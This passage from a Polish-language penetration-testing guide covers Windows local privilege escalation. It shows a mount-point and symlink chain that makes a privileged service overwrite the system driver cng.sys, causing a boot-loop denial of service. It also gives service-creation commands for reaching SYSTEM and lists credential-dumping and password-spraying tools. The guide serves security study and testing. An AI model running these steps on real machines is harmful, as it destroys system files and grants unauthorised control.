Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **konfiguracji z prawem zapisu**, przekieruj tę ścieżkę za pomocą **symlinków Object Manager + punktów montowania NTFS**, aby zmienić uprzywilejowany zapis w dowolne nadpisanie pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca docelową ścieżkę jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i symlinku pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić uprzywilejowaną lokalizację logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w pliku `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wywoła „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parserem hex/PE), aby potwierdzić jego uszkodzenie; ponowne uruchomienie wymusza na Windows załadowanie zmodyfikowanego sterownika → **DoS w postaci pętli rozruchowej**. Tę metodę można też zastosować do dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać podjęta próba załadowania jej w pierwszej kolejności, co czyni ten plik niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do SYSTEM**

### **Nowa usługa**

Jeśli działasz już w procesie o wysokim poziomie integralności, **ścieżka do SYSTEM** może być prosta: wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest on prawidłową usługą albo że wykonuje wymagane działania dostatecznie szybko, ponieważ zostanie zakończony po 20 s, jeśli nie będzie prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokim poziomie integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell przy użyciu opakowania _**.msi**_.\
[Więcej informacji o powiązanych kluczach rejestru i instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### Wysoki poziom integralności + uprawnienie SeImpersonate do System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do uprawnień Full Token

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o wysokim poziomie integralności), będziesz w stanie **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) za pomocą uprawnienia SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika zwykle polega na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu potoku, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała dane do tego potoku**. Następnie **serwer**, który utworzył potok przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta potoku (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj to**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia z wysokiego poziomu integralności do System przy użyciu name pipes, przeczytaj to**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przechwycić dll** **ładowaną** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny przy tego rodzaju eskalacji uprawnień. Co więcej, znacznie **łatwiej przeprowadzić go z procesu o wysokim poziomie integralności**, ponieważ będzie on miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/index.html)**.**

### **Od Administrator lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i wrażliwe pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Lokalnie użyj opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia dane uwierzytelniające z Credential Manager. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe rozpoznanie Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (wymaga kompilacji za pomocą VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Przeszukuje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia dane uwierzytelniające z wielu programów (precompiled exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (precompiled executable na github). Niezalecane. Nie działa poprawnie w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z python). Niezalecane. Nie działa poprawnie w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go użyć).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt, używając odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacja uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — Ataki na Windows: AT jest nową czernią (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → deszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokena jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — W pogoni za Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w systemie plików o podwyższonych uprawnieniach w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania dowiązań symbolicznych — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Łącze do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port BOF dla Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Pułapki zaufania w Node.js: niebezpieczne rozstrzyganie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — przejęcie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna funkcja odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Wykorzystywanie dowolnego usuwania plików do eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, lokalna eskalacja uprawnień w Windows 10 typu 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — delegowanie ograniczone oparte na zasobach Kerberos: jak zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — Przekształcanie firmowych serwerów aktualizacji w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — Przekształcanie firmowych serwerów aktualizacji w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — eskalacja uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: odtwarzanie śladów prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — porada dotycząca eskalacji uprawnień przez przesunięcia w pamięci współdzielonej Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
